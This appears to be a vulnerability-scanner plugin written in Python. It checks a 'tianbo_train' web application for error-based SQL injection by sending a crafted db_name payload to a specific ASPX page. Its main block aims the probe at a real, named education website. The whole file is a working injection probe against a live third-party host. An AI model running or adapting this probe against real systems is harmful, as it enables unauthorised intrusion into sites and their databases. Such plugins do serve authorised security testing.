#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-059811



def assign(service, arg):
    if service == "tianbo_train":
        return True, arg
        
        
def audit(arg): 
    payload = 'Web_Org/CW_Default.aspx?infoid=4102&couseid=4102'
    getdata = '%27%20and%20db_name(1)%3E0--%27'
    url = arg + payload + getdata
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500 and 'master' in res :
        security_hole(arg+payload+'   :found sql Injection')




if __name__ == '__main__':
    from dummy import *
    audit(assign('tianbo_train','http://www.fenghuaedu.net/')[1])